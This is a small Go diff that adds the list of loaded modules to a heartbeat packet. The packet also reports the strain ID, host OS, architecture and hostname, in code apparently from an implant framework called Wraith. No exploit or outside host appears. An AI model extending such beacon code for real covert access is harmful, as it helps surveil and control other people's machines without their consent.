@@ -186,6 +186,7 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				heartbeatData := proto.PacketHeartbeat{
 					StrainId:   strain,
 					InitTime:   initTime,
+					Modules:    w.ModsGet(),
 					HostOS:     runtime.GOOS,
 					HostArch:   runtime.GOARCH,
 					Hostname:   hostname,
